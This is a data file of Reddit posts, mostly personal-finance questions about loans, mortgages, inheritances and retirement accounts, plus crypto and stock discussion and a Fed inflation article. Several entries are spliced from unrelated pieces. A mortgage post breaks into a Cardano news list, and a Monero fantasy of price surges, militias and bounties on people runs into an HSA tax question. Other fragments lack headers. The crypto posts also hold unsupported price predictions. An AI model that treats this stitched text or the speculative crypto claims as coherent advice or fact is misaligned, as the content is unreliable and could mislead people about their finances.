personalfinance,Car payments not showing up on my credit report and Loan transferred to another bank with no notification or communication.,"Hey so I have some questions I’m hoping someone can answer or give advice for. So first like the title says I have/had? a car loan with my personal credit union. It was a very small branch but had good rates for loans and good customer service. I’ve had a car loan with them for a few years and have made every payment on time, the full amount if not extra when my budget allows it. However I was applying for a loan the other day through another company and they brought up that I told them I had an auto loan and said it was a certain amount but they have no record of it on my credit score. So I looked into it on credit karma and experian and it’s not showing up. I see it on the closed loan section with last reported payments listed as months ago.  So I’m not getting the benefit of paying my car payment on my credit report and the added benefit of how long I’ve had the account open. Well the other day I found out this credit union was taken over by some federal regulation agency for credit union for losing a lot of assets and unethical business practices. So they sold or gave away all accounts and loans to other banks. No communication about this for a heads up, approval, or anything just did it and they split the accounts up. So my checking and savings account is moved to a new credit union with my loan going to some big loan company. Now reading through my loan agreement documents it mentions nothing about my credit union having the right to transfer or sell my account to another bank. It does have an agreement about me falling behind and if I do that standard fees (repo, late fees, legal fees, etc could be owed by me). So I guess my biggest question for this part is can they really transfer my loan without telling me or asking? If they can do I have to keep it with the new holder and pay them since my agreement isn’t with them? And would this be the best time to inquire about it not showing on my credit report? Also would this be the best time to request to refinance it or ask them to turn it over to the credit union my accounts moved to because the auto loans they offer are way better than what my old one offered. Any help would be appreciated.",finance

personalfinance,Can I reasonably afford an apartment?,"I'm 21 and working full-time (in Canada). Right now the office I'm working in is planning on moving buildings, and with this change my commute would be about an hour and a half one way. Because of this, and because I don't always see eye to eye with someone I'm living with, Ive been on the fence about moving out. Can y'all give me advice?

I earn $425 a week (paid on a weekly schedule for 40 hours) so I make about $1700 a month. Currently my expenses include $85/month for peggo (city bus/transportation), $55/month for phone, $80/month for health insurance (plus about $20 a month for meds, depending on when I refill prescription), an extra $15 for youtube premium. Also paying $200/month for rent as I'm living with my bfs parents.
 Im also due to pay $25/month for my provincial student loan (didn't finish school) in May but I've been paying more when I can to pay it off sooner. I currently owe ~$1800 for prov loan and ~$9800 for federal loan (which I'm not expected to pay yet but wanna get on it sooner than later).
I'd be moving out with my bf as well, who makes approx $1100 a month, he works about 20 hrs a week. His expenses are super low, he refills peggo as he goes (which adds up to $120 a month) and is about to start paying own phone plan, so unsure about price. Neither of us can drive rn.

I'm leaning towards staying where I am even tho it's not the best because I can focus on loans and savings, but my mom thinks because of how I don't always get along with my bfs mom (she can be set in her ways and we don't always communicate) and because of the commute, I should consider moving out. 
I think that with our combined incomes we could probably afford something (1br apartment would be $950-$1000 a month for something reasonable) but it would definitely be tight. But I'm not sure if having a tight budget but quicker commute/more freedom would be worth it? I'd also be looking for something in between our work places so commute wouldn't be bad.

algorand,I sold all but $750 worth of ETH and moved it all into Algorand.,"My buy-in price for ETHEREUM was $234, and I bought nearly twenty in 2017. What convinced me to sell my ETH was these three events: I had to pay a one-time gas fee of $76 to put up three NFTs at OpenSea. Next, I'm not too fond of the idea that the NFT will be on two separate blockchains when ETH forks. What happens if they fork some more? Finally, I don't feel good about ETH politics with the miners. They are like a union. ETHEREUM 2.0 got an accelerated launch date because the miners talked about making a 51% attack on the coin.

I pick Algorand for it solved the ""trilemma."" No coin will do well with a anemic Transaction Per Second Speed (TPS) that ETH and BTC suffer. The ALGO team is like NASA compared to the majority of coins. To be honest and transparent, I am hopeful the FED Reserve and ECB will choose Algorand as their blockchain.

personalfinance,How to manage this inheritance?,"In the last few years I’ve had two wealthy family members die, and altogether my inheritance will total close to $1,000,000.  I’ve been lower to middle class my whole adult life and I just want to know what I should be doing with this overwhelming amount of money. (Before you warn me- I haven’t told anyone about this money other than very immediate family). I feel kind of dumb about money and investments and stuff.

I got $400,000 4 years ago which is in an inherited IRA and is invested through LPL financial and has now become $500,000. I took out $20,000 when I first got it to pay off some debts (mostly from traveling several times to see this relative before they died) and buy some things I needed after living several years in poverty. Other than that, I’ve only taken the RMD each year but haven’t otherwise touched the money.

Last year another relative died and the estate is still settling but I will receive about $500,000 total. I plan to invest it also through LPL.

I have absolutely no interest in learning about investments and for that reason I have someone managing the money for me. The financial manager I have is through my credit union.



Have a stable retirement. We want to spend retirement in a combination of traveling and going between the US and my husband’s country

Here’s  my current financial situation and some of our financial goals:

I’m 37 years old and married with two young kids. Spouse is a student/stay at home parent, and has no idea what he would want to do for a career-he moved to this country to marry me a few years ago and his previous work isn’t viable here so he has had to start over. I’m totally comfortable being the breadwinner and have no concern with this arrangement.

I am a nurse so my job is very stable/in demand with a huge variety of opportunities. I earn about $85,000 per year working full time and I can easily get to over $100,000 with overtime but I don’t really like working extra. This is plenty for us to live comfortably and save a bit. 

Our mortgage (including property tax and insurance) is about $1100/month after I just refinanced to 2.375%. I was lucky to buy when prices were super low ten years ago. I bought the house for 185k and similar houses are now going for over 300k.

The house is a bit small for four of us so sometime in the next few years I’d like to get something slightly bigger, ideally with a few acres to have a little homestead.

We have two cars that are fully paid and 10ish years old. I’d like to replace one of them with a hybrid small SUV probably this year. I’ve been eyeing the rav4 but I’m not set on it. We love to travel and camp too so we’ve thought of getting a large converted van (or small RV or school bus) for family road trips.

We’d like to buy some kind of house or apartment in my husbands home country but I don’t have a good sense of what that might cost.

I’d like to put aside money for my kids to use for college or a house down payment.

We have about $20,000 in federal student loans between us. Interest is between 3.7-4.5%

No other major debts or expenses, though we may put out younger kid in daycare at some point in the next year or so. Our hobbies are pretty inexpensive so we’re not out buying boats or anything crazy.

Specific questions I have:

Do I need to worry about putting away additional money towards retirement beyond what I’ve inherited? I know a million is way more than most people have, but is it enough to stop adding to it at this point?

What is the best way to put away money for my kids? Does it need to be in specific accounts for them or can I just keep it all together?

Should we just pay off the student loans all at once to be done with them or keep that additional money invested and just make monthly payments?

For buying a car or a house, does it make sense to take loans on them versus paying them outright? At what interest rate does this answer change?",finance
personalfinance,Lender has ran my credit report and my partners credit score came 30 pts lower...,"Essentially it went from 766 to 736 which totally screwed our financials and increase the PMI and lender costs. Apparently there was a hard credit pulled under her name that she did not authorize, I had 1 pulled under my name for a check but her score is the 1 that got dinged even though she didnt have anything to do with it.

Essentially, this is the situation (nightmare) I'm in.

This was our plan and situation:
- With 10% down, my monthly payment for only mortgage is 2653 and PMI is 86, the lender  fees at this point is $1912

This is our new situation and options:

- With 10% down, my monthly payment for only mortgage is $2653 and PMI is $126, the lender fees at this point is $5300.

- With 20% down, my monthly payment for only mortgage is $2362, lender fee 0. The additional 10% is $65000


The difference in cost (mortgage + PMI) is roughly $5000 per year + 5300 in lender fees (not paying)

So first year the the ROI of the $65000 is $10300. Then resulting 5 years it is $5000/year and then it is $3400/year onwards.

2. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul.  It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline.  Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem.  To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the  transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”.  When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase.  The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

dogecoin,My ramble/hot take about why Dogecoin being uncapped is actually good,"I think the reason so many people fear an uncapped cryptocurrency is because we know that over time it means we each control a smaller piece of the pie if we don’t buy more. I don’t think that’s something worth worrying about when the inflation rate is low and predictable. As time passes it will become increasingly insignificant on any timescale that is meaningful when compared to any of our lifetimes.

I think dogecoin has value because it’s the people’s crypto and ownership is distributed. Robinhood is totally the whale imo and there is no other cryptocurrency I know of where small retail investors control at least 28% of the supply. Over time, even if they don’t sell, the influence and percentage of the total supply controlled by the largest doge holders will decrease unless they buy more coins. I think this will enable dogecoin to become more decentralized and distributed than bitcoin.

There are already so many deflationary forces in the world. Even with fiat, the fed increased the money supply by 40% last year and we can still buy computers and phones that are WAY better than the ones we could buy for the same price a few years ago. I am not saying the amount of money printing happening now is sustainable, but I believe a lot of inflation fears are overblown and I personally have a hard time believing the doom and gloom that price stability could not be maintained indefinitely by a hypothetical society with a money supply inflating predictably by a few percent each year. Increasing the dogecoin supply by less than 5% each year is not going to meaningfully affect the purchasing power of our dogecoins. What it will do is make centralization harder/more expensive.

If a single entity controlling a large percentage of any cryptocurrency decides to sell it all at the same time, it could crash the price and create a panic. Even if that’s not a major concern for everyone, I think most people would agree that it’s not great. If suddenly a single entity can increase the supply of coins for sale by 10x or 50x or more, that’s probably at least slightly more negative than positive for most market participants. 

When a coin is capped the biggest holders become MORE powerful and influential just by holding as coins get lost over time. I am unconvinced that feature of Bitcoin is going to be as exciting to someone in 50-100 years (who does not feel like they are getting in early) as it is to many of us today. I think overtime the networks that are the most distributed will be the most attractive to new users.

Dogecoin is going to increase in value over time because of adoption. The price will go up if more people to want dogecoin tomorrow than want it today. I don’t think adding mechanisms that further concentrate wealth would be a sustainable way to attract users to the people’s crypto long term.",cryptocurrency

personalfinance,Worried about switching to a one-income household (and ditching the larger income),"I earn 150k, spouse earns 90k. We're considering some big changes. Mainly (1) moving to a (relatively) lower COL city, (2) spouse getting a new, lower- paying job there (68k), and (3) me quitting once we have kids in a couple years, and focusing on raising them. My spouse loves to work. I do not. We are in our early 30s. Here are our basic financial details:

Spouse:

120k savings. Half liquid, half not (retirement funds). No debt.

Me:

425k liquid savings

215k non-liquid savings (retirement account plus approx home equity) 

300k student debt (yes, you read that correctly... the reason it's so high is because it's on federal income-based repayment plan with eventual forgiveness and non-compounding interest. don't judge it unless you understand how those plans work, in which case judge away :). I would estimate the total eventual cost to be 100k). No other debt.

We don't spend a lot. Our biggest categories are travel and food/entertainment, and those are still low. I didn't always earn 150k - it was closer to 100k for a long time. We currently tend to put away 60%+ of annual take home pay, and that's when we're paying a mortgage. Our lifestyle in the new city would likely be pretty modest and frugal. If we move, we plan to own a reasonable house (250k-400k) in full with no mortgage.

So... do you think this plan will work? Can we get by on just 68k but no mortgage payments? What if we also plan to have a couple of kids? I could do a side gig or two (many transferrable and entrepreneurial skills), but ultimately we want me home with the kids.

personalfinance,Should I make multiple extra payments to loan or pay 1 lump sum?,"I recently got a raise at work that will finally allow me to not be in paycheck to paycheck mode and contribute more to my savings. I have a \~6 months if I were to lose my job amount of money in my savings scraped up over the years, and now I'd like to start addressing my student loans.

Right now I pay about 700 a month on one consolidation loan, it's a 20 year loan, with a 5.62% interest rate. Am I better off to make additional payments every month (say an extra 1,000) and whittle it down over time, or should I just be banking the extra until I can make a big lump sum payment? Or does that even make a difference?

I'm thinking that because of the interest (something I'm not really clear on exactly how it works apart from the obvious) I'd pay less in the long run if I were to make an additional payment each month? But another part of me just wants to bank it all for a mega oh shit moment.",finance

personalfinance,How to rollover my 403b or take the cash,"I worked mostly part-time for a 501c3 and was able to put money into a 403b during my time there. I would only work there fall-spring because I had a summer job that paid a lot more and they were okay with this. It’s a retirement community that was hard hit early on during covid so naturally I wasn’t working there for months and because of the risk I didn’t go back.   


They switched where the 403b was kept and I must’ve missed a notice that said they were withdrawing my money due to employee termination. So I got a check for under $500 with the 20% federal withholding taken out.   


I’m unsure what do do with this money. I have a Roth IRA with $\~8k in it but if I understand correctly if I put the money into that I’d be subject more taxes and to a 10% early withdrawal fee.   


Do I open up a Traditional IRA and put the full amount in to get back the 20% withholding? If I’ve yet to file my taxes for this year would I be able to do this and then get reimbursed this year or would I have to wait until next year?   


Or do I just eat the $50 from the 10% and have $450 in cash. I’m still a full-time student for another year.

personalfinance,Buying out an inherited house,"Hi, new to posting on Reddit but have been lurking for awhile.  I am in the process of buying out my brother’s half of a house we inherited from our late mother.  We agreed on a price of $88k for his portion of the house, and I’m debating whether I should buy his portion in cash or finance the house.  Here are some relevant variables:

- I’m 32 living with my spouse, no kids, but looking to have kids in 3-4 years
- House is located in South Florida, built in 1984
- I currently live in the house
- The house was completely paid off, no existing mortgage or liens
- The house currently has no insurance policy on it
- The house is livable but needs repairs/replacements (new roof, new doors, flooring, etc) totaling about 40k.
- I was approved for financing at 2.75% for 15 years.  $2,500-$3,000 in closing costs (inspections, fees, etc)
- I have a net worth of about 490k, about 200k in retirement, 210k in brokerage, and 80k in cash.

My thinking for financing would be that it’s a low interest rate and would have cash left over for the repairs/replacements without having to liquify brokerage assets.  My thinking against financing is that it seems like the interest+fees+insurance would be high for a relatively small amount vs just paying cash.  The house doesn't meet current hurricane codes so any insurance will be approximately $3000/year; I was hoping to first bring the house to hurricane code through the repairs/replacements and then apply for insurance later.

I was thinking for cash in that I have the house paid off and don’t have to worry about the mortgage and save the money on the fees and higher insurance.  My thinking against cash is that my cash assets (beyond my emergency fund) would be spent and I wouldn’t have any cash left for repairs/upgrades unless I either save up and do repairs when the cash is saved, take out a HELOC, or sell some of my brokerage assets.

I’ve never bought a house or financed anything in my life, and it feels like there’s a lot of moving parts to this, so I guess I’m just looking for advice/points of view to help me think clearly and if there’s a path that makes more sense.",finance

personalfinance,Help comparing mortgage options and deciding,"My soon-to-be lender is providing alternatives for mortgages (different down, interest rate, etc.) and I'm having trouble deciding. It's my first home purchase and I'm going through it by myself so I would really appreciate input from others.

All options are for a 30yr Mortgage.

Options below (% Down / % Interest / Origination Fee / Monthly P&amp;I Payment)

**Option 1:** (10% ($33,700) / 3.125% / $4,500 / $1,298 ) - Note this option also has PMI tacked on, which is $4,800 for my home. I have the option to finance this, or include it as part of the closing costs (Currently included in P&amp;I above)

**Option 2:** (20% ($67,000) / 3.125% / $2,067 / $1,154) - Essentially ""low closing cost option""

**Option 3:** (20% ($67,000) / 2.625% / $8,807 / $1,082) - High closing costs, but low interest

&amp;#x200B;

Option 1, seems the most attractive since it's the lowest entry cost, but I'm not sure I should be looking at it that way. I was pretty locked down on a similar offer to Option #1 (but lower interest and Origination Fees), but my ""Rate Lock"" expired due to delays on their side so they are now claiming the original offer will not be honored. That's a whole different story by itself, but since I'm unlikely to win a battle in claiming my original offer, I want to understand what my next best option would be out of what they are offering now.

I am currently 25 years old and have been living in my deceased grandparents' old home located in New England for close to two years now. Since their passing, the house moved into a trust co-shared by my mother and uncle. I have been paying all costs of living while living in this home.

My mother is now asking me to make a decision on whether I plan to purchase the home, or move out and live with my girlfriend. My girlfriend lives in the city with her roommates and her lease expires in the fall. We now have to decide whether to find an apartment in the city or purchase this house.

The house was built in the 1940's. It is by no means a ""forever home"". It has all the necessary requirements and a relatively good sized property, but it's nothing I would brag about. Some fundamental upgrades would include re-insulating the master bedroom, re-doing the bathrooms, and updating the upstairs HVAC. Other upgrades I would consider include either removing the exiting wallpaper and painting or re-wallpapering, and re-doing much of the carpeting upstairs and flooring downstairs.

The house was valued somewhere between $250K and $300K when put into the trust. My mother doesn't care about the money, so I would only have to buy out my uncle (so between $125K and $150K purchase price). I have about $10K saved up now to knock down the potential borrowed amount.

My girlfriend does not want to live in this home. She would rather live in the city for the next couple of years and save up for a more permanent home. I, on the other hand, think this would be a good investment, considering the purchase price and currently low interest rates. We could sell this place in a couple of years when we are ready to buy a nicer, more permanent, home.

Overall, I think taking on a mortgage for this home would be much cheaper on a monthly basis compared to rent in the city, and we could use the funds from the sale to pay off the mortgage to buy a nicer home a couple years down the road.

I ask that you all give your professional opinion on the matter, and please let me know what kinds of questions I should be asking during this process. Please let me know if there are other details that I should edit into this post or you think I may not have considered in this brief analysis. I am relatively new to this sub so let me know if there are any rules that I am not following.

Edit 1 (Income/debt): My girlfriend and I make about $120K pre-tax. My girlfriend and I currently have about $150K combined in student loan debt.

Edit 2 (Rent vs. buy): The cost of an apartment that we would look to purchase in the city would be between $1,800 and $2,000 per month before any utilities. The cost of a 15 year mortgage in the house subject to discussion would be between $750 and $800 per month before utilities. Property taxes for the year on the home amount to $4,500/year

Edit 3 (girlfriend's intentions): I understand that it ultimately comes down to a mututal decision. However, as we are both pretty unfamiliar in the housing market and home buying experience, I have submitted this post so that we may use the information and ask the right questions in order to make the best decision for the both of us.

Edit 4 (home valuation): The house went into the trust valued at somewhere between $250K and $300K (for which I only need to purchase half \[$125K to $150K\]. The current Zillow valuation of the home is between $406K and $458K.",finance
CryptoCurrency,Suggestion to allocate or reallocate moving forward,"Hello, today I received an email from one of the crypto exchanges I am using to keep an eye on ETH, and possibly invest in ETH. I have, with my my limited knowledge of crypto, been able to create a diversified a portfolio. 

I have a few options:
Scrape cash together and purchase ETH, probably on a dollar cost average basis, over the next couple of days to weeks. 

Take out a collateralized loan to gain access to Fiat, using those funds to get into ETH.  Using the same DCA methods. Depending on loan interest rates/terms I may exit ETH in some percentage to repay the loan. 

Liquidate to Fiat, or crypto to crypto trade existing portfolio coins for ETH. Some options would be all or portions of positions I hold in BTC, BCH, EOS, XLM, ADA, XRP, and TRX. 

I understand there are many variables, such as what percentage allocations I hold in my
portfolio, what the exchanges terms and fees are, APR of loan, tax liabilities, etc. I’m not looking for step by step trading advice or coaching, though if someone could give me a suggestion with the reasoning behind it, I could then look more seriously into that method and make an informed decision. 

Thank you.",cryptocurrency

It was somewhat cringe worthy. I was asking some tough questions through the chat, the video responds to two of them. Some they decided not to answer and those they did they really didn't say much of substances in response. It basically came down to the justification, ""because it isn't crypto/DeFi"". The question they conveniently chose to overlooked was when I asked how CDBCs would change interest rates and lending practices.

personalfinance,Building credit for home loan approval,"I am currently attempting to save $1000/mo in hopes of purchasing a multi family property in a few years time. My credit score is within the very good range but I have limited credit history. Currently a $2,500 limit card through my credit union and a target red card and I pay off both in full each month. 

I had the idea to purchase a 2004 model used enthusiast car with $10k down and finance $12.5k for 36 months or less. This would be to build more credit and it would be a 2nd car so it would not be driven much and may appreciate in value throughout the loan. 

I applied for a loan through PenFed with the above terms and was denied. 

Does financing a used car make sense to build credit in hopes of being approved for a home loan down the road?

Are there other options for obtaining financing for a 17 y/o car in my situation? 

I know a personal loan is an option but the rates are high AFAIK?

stocks,Reflection on timing the COVID pandemic in the stock market Q4 2019 - Q1 2020,"Upon these eventful past 12-18 months with the COVID pandemic (and still counting) I was wondering and reflecting about how Q4 2019 - Q1 2020 played out in the stock markets. Although it is not long ago yet there might be interesting bits and pieces of knowledge in the past.

Specifically my question for those actively engaged in the markets at that time I was wondering if anyone A) strategically sold everything i.e. went fully in cash (or equivalent) and based on which events and how did your timing work with markets up for much longer, B) how did you plan your re-entry and based on which events and when, C) what would you do different next time in hindsight how the events unfolded?

For myself I was too busy with work to notice, even after the first places in China and Italy went into full lockdown and dismissed it as a ""flu"". Then I missed the rally gong in the Fed statement on March 23rd 2020 and still expected more markets corrections. So both times way to late for the big moves (down and then up).",finance

personalfinance,Insperity 401k loan -- should I pay this off?,"My employer uses Insperity, and I've got \~$60k in a 401k with them.

Last year during COVID I needed some extra funds, so I took out a $60k loan from them. Payments didn't start until January 1, 2021, and the interest rate was 4.25% on a 5-year loan. They payroll deduct the principal and interest payments (it's about $585 per pay period).

I'm now in a position where I can pay off the full $60k loan. However, I'm wondering if I should.

a) 4.25% is less than 5%, which seems to be the benchmark of when you should pay off debt, but I don't think that even matters because... 

b) Every cent that I pay in principal AND INTEREST goes back into my 401k. I just called them to confirm. Of the $585 I pay, \~$475 is principal and \~$110 is interest (this will obviously change over the life of the loan, but let's just say it's constant). 

Every payment I make, the $475 gets deducted from my $60k loan balance and is put back into my 401k allocations, while the $110 of interest is treated as an ADDITIONAL CONTRIBUTION to the principal -- Insperity does not receive the interest, my 401k balance receives the interest. I've thus far had 6 payroll deductions, meaning my total balance in my 401k is the $60k (of the loan) + $660 (from interest payments) + the capital gains on the principal and interest from the start of January.

&amp;#x200B;

So my question is... is there any reason I should pay this loan off? The interest rate is low, but regardless, I'm paying myself the interest anyway -- e.g., if I had a target annual 401k contribution, I could theoretically just reduce it by $110 per pay period and still have the exact same increase in principal into my 401k.

&amp;#x200B;

The only fees Insperity charges for administering this loan are $12.50/quarter (yes, $50/yr).

&amp;#x200B;

Seems almost like a ""too good to be true"" thing, where I can just use the $60k for other investments/purposes while slowly putting it back into the 401k over time. I'm not even prohibited from making additional contributions into the 401k before the loan is paid back.

&amp;#x200B;

Does anyone have any experience with this loan/any advice for me? Thanks!",finance

Stocks traded roughly flat Tuesday, putting a pause on the recent record-breaking rally. Market participants are encouraged by better-than-expected economic data and President Biden’s infrastructure plan. 

The March Jobs Report blew past consensus estimates to record the fastest pace of job growth since last summer. Nonfarm payrolls increased by 916,000 for the month while the unemployment rate fell to 6% (unemployment rate was 14.6% in April 2020). Economists surveyed by Dow Jones had been looking for an increase of 675,000 and an unemployment rate of 6%. Quincy Krosby, chief market strategist at Prudential Financial said, “It \[the jobs report\] shows that the economy is healing, that those who lost their jobs are coming back into the workforce as the recovery continues and restrictions are lifted.”

As the economy continues to recover, analysts have been expediently raising their estimates for companies' first-quarter earnings results, with earnings season beginning in just a couple weeks. According to FactSet, first-quarter [earnings estimates were increased by a record margin of 6%](https://insight.factset.com/record-high-increase-in-sp-500-eps-estimates-for-q1) over the past several weeks, as analysts adjusted their forecasts for the much stronger-than-expected economic rebound seen so far. Larry Adam, chief investment officer at Raymond James said, “Not only is the economy doing better, but that's actually leading to earnings revisions going higher, and that's taking the market higher. And I don't think we're done yet. I think people are going to continue to see the strength of this economy during the summer, and you're going to see earnings continue to move up significantly throughout this year.""

The vast majority of US states are on track to open vaccine eligibility to all adults before President Biden’s May 1 deadline. An average of more than 3 million individuals are getting vaccinated every day, according to the Center for Disease Control and Prevention (CDC). As vaccine distribution efforts continue, cyclical and reopening stocks have outperformed growth and tech stocks that led the market higher in 2020. We expect this trend to continue moving forward, as more states gradually reopen. 

Looking ahead, this week will be chock full of commentary from Federal Open Market Committee (FOMC) members, who will offer their assessment of the latest batch of economic data and how they will proceed. .

personalfinance,I could use some advice on repaying a loan from my Father,"My father recently took a personal loan out for my little sister to help her buy her first car (and she didn't have anything saved or a credit score). The minimum amount that he had to loan was higher than the amount he actually needed so he offered me £4000 which allowed me to cut up one of my 3 credit cards, as long as I pay him back plus the interest.

I've been working my butt off trying to get the balances down on the remaining 2. At the start of 2020 I owed almost £10,000 after being lumped with a lot of debt at the end of a bad relationship, then losing my job and getting sick, now I'm kind of back on my feet and down to 2 credit cards.

Credit card A is a at £1,600 with a £5,000 limit which I can (at a squeeze) pay off by November (which is when the 0% interest period ends)

Credit card B is at about £1,900 with a £7,500 limit and that one I will have to switch to minimum repayments (18% APR) while I focus more on paying off credit card A during the 0% interest period. After that I then want to increase my payments on credit card B to try and bring it down to £1,000 by the beginning of 2022.

I have always met my repayments with credit card A, and this is the second balance transfer they've given me after I tried to leave last time, having paid off the first debt initially. They let me have the limit that I needed and I balance transferred more of my debt to them, then I got stuck in between jobs which set me back.

My dad has said we can discuss paying him back over a couple of years, but honestly I want to repay him as quickly as I can. If my credit card A company offers me another balance transfer 0% period when I try to close the account, I would like to ask for a £5,000 limit again and then use credit card B to repay my father what I owe him, then balance transfer EVERYTHING from the credit card B into credit card A and pay it off over 2 years, or however long the interest free period is (its usually 25-29 months)

I don't know if this is irresponsible or not, it seems logical to me as it rids my dad of the debt, and honestly I felt so embarrassed and ashamed accepting that money and I know he'll have to pay it back himself at some stage. I would much rather take advantage of the possible offer I may get on credit card A when I finish paying it off in November, so I can take the entire debt back into my own hands. 

I also can't decide which credit card to keep for emergencies while I build up savings once I'm eventually debt free in a few years, as both of them are at the same interest rate, but 1 has a higher limit. 

If anyone is able to give me their opinion on my approach I would greatly appreciate it!",finance

Flash mobs, militias, and guerilla soldiers with various political ideologies have formed. Travel has been banned for anyone who hasn't received the vaccine passport. 

The price of 1 Bitcoin has shot up to $500,000. Governments and corporations around the world are using debt / printed money to buy up as much Bitcoin as possible as fiat continues to crash. Bitcoin has officially gone mainstream and normies are using their UBI to buy Bitcoin instead of holding into fiat. The overnight success has prompted Mastercard, Visa, UN, World Bank, WEF, FINCEN, Blockstream, Governments, and Institutional investors to add dystopian regulations to Bitcoin. All self hosted wallets and addresses must be connected to an identity (KYC) or they are blacklisted by Chainalysis. Self hosted bitcoin without identity attached is only worth $250,000 (50%) on the black market due to a lack of fungibility. The majority of investors comply with the regulations to protect their new wealth. 

Anonymous developers finally finish Monero / Bitcoin atomic swaps. Silk Road OGs start to drop 1000s of BTC onto the markets in exchange for Monero causing a 25% BTC crash overnight. Monero skyrockets from $2,000 to $25,000 overnight. All of Wall street bets, 4chan, telegram, and gab start to convert as much Bitcoin &gt; Monero as possible. The price of 1 Monero reaches $100,000 and Bitcoin falls to $280,000. The UN and World Bank call for a total ban on Monero and threaten 10 year prison sentences for anyone who runs a Node or owns more then 1 Monero. 

Monero Citadels start to form. Only people with 5+ Monero can enter the citadels. Militias and rogue law enforcement officers start protecting the citadels in exchange for Monero. Monero users start crowdfunding anonymous bounties on people's heads who are behind the great reset. Milities and guerilla warriors start to sieze Bitcoin from the globalists and atomic swap it for Monero. Normies start to atomic swap as well causing Bitcoin to flash crash to $2,824. Monero is no longer valued by dollars and has officially won the crypto war. People can now buy a mansion for 1 Monero and a yacht for .3 Monero.

When would I typically be able to do this? I would be depositing almost $2K in my account for 2020 and I'm in the 24% Federal/9% CA State Bracket meaning I would get back an additional ~$660 in refunds I think.

Are there any issues with making this deposit before April 15th into my HSA and amending my taxes, anything I should be careful of?",finance
stocks,Is Inflation Making a Comeback?,"**By** [**Fernando Martin**](https://research.stlouisfed.org/econ/martin/sel/)**, Research Officer and Economist**

[https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback](https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback)  


The average price level dropped sharply during the early stages of the COVID-19 pandemic and has gradually recovered since then. As a result, annual inflation has remained low:

* The 12-month change in the personal consumption expenditure (PCE) price index reached 0.5% in April 2020, its smallest increase that year.
* Core PCE inflation (which excludes food and energy) registered 0.9% in the same month.

Since then, both measures have remained well below the Federal Reserve’s 2% annual inflation target.

## Recent Trends in Inflation

By January, both PCE and core PCE price indexes were back to their pre-COVID-19 trends. This suggests an interesting exercise: Assuming prices remain on trend, what will inflation be in 2021? We can think of this exercise as informing us of the “mechanical” inflation resulting from things returning to normal.

The figure below shows actual PCE inflation and projected inflation for the remainder of the year.[1](https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback#) I projected inflation by taking the PCE price index from 2015 to 2019 and projecting it onward, and then calculated future inflation as the growth rate between the projected index and the *actual* price index from 12 months prior.



https://imgur.com/a/aLQydnj

As we can see, these estimates project annual inflation above 2% for three months (March, April and May) and converging back to the pre-pandemic average towards the end of the year.

Given the new framework for monetary policy adopted last August, this temporary and mild rise of inflation would be consistent with the Fed’s objective, stated as “following periods when inflation has been running persistently below 2 percent, appropriate monetary policy will likely aim to achieve inflation moderately above 2 percent for some time.”[2](https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback#) In other words, we should not expect the Fed to react to this temporary rise in inflation.

## Inflation Hints from Other Macroeconomic Variables

The exercise I conducted assumes prices will follow their pre-pandemic trend. However, the pandemic and the policies implemented to combat it have significantly altered the economic landscape. Might these changes imply even higher inflation?

The following series of figures display several key macroeconomic variables, which articulate various views on inflation. All these variables suggest the presence of further inflationary pressures.

### Inflation Expectations

We can think of inflation as a self-fulfilling prophecy where actual inflation depends on expected inflation. This view is shared by many central banks to explain long-run inflation. In this view, a successful central bank anchors inflation expectations around its target for inflation. The figure below shows one measure of expected inflation: the difference in the annual yields of five-year Treasury notes and five-year Treasury inflation-protected securities (TIPS).[3](https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback#)



https://imgur.com/a/BO7JvJ8

According to this measure, expectations about future inflation have been rapidly accelerating. This may be due in part to the adoption of the new monetary policy framework, as the market now understands that the Fed will let inflation temporarily rise above a 2% annual rate to make up for lost ground. However, it is a variable that deserves close monitoring, especially if it goes significantly above the Fed’s target.

### Unemployment

The so-called Phillips curve states a negative relationship between inflation and unemployment. The theory—popular among central banks—leads one to expect higher (lower) inflation as the economy strengthens (weakens). As such, it is mostly used to explain cyclical variations in inflation around some long-run value.

The next figure shows two measures of unemployment:

* The official unemployment rate
* The U-6 rate, which includes those marginally attached to the labor force or employed part time for economic reasons



https://imgur.com/a/UEXkJyo

Both measures have recovered significantly but remain elevated relative to the pre-COVID-19 period. If the economy continues its strong recovery, unemployment is expected to fall even further, which would imply inflationary pressures.

Note, however, that the empirical relationship between inflation and unemployment has diminished significantly in recent years—if not altogether disappeared—and may not be relevant for the current episode, just as it was not during the previous recession.[4](https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback#)

### Monetary Aggregates

Monetarism is the theory that relates the price level to some monetary aggregate (e.g., currency) and inflation to the growth rate of monetary aggregates. In a modern economy, currency accounts for a small fraction of transactions, so economists look at “broader” monetary aggregates. The figure below shows two such aggregates (M2 and MZM), which both grew significantly between February and May 2020.[5](https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback#)



https://imgur.com/a/S3t7vhG

